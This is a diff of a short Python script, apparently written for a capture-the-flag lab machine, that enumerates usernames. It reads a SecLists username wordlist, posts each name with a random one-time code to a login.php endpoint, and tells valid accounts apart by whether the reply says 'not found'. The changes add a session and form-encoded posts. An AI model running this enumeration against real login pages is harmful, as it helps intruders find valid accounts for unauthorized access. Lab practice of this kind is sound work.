@@ -6,12 +6,13 @@ import requests
 
 debug = True
 
-dictfile = '/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
 
 if debug:
     host = '127.0.0.1:8181'
+    dictfile = '/usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
 else:
     host = '10.10.10.122'
+    dictfile = '/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
 
 
 endp = '/login.php'
@@ -25,7 +26,9 @@ usrname = f.readline().strip()
 while usrname != '':
     postparam["inputUsername"] = usrname
     postparam["inputOTP"] = str(random.randint(10000000, 99999999))
-    r = requests.post(finaluri, json=postparam)
+    sess = requests.session()
+    sess.get('http://' + host + '/')
+    r = sess.post(finaluri, data=postparam)
     if 'not found' in r.text.lower():
         pass
     else:
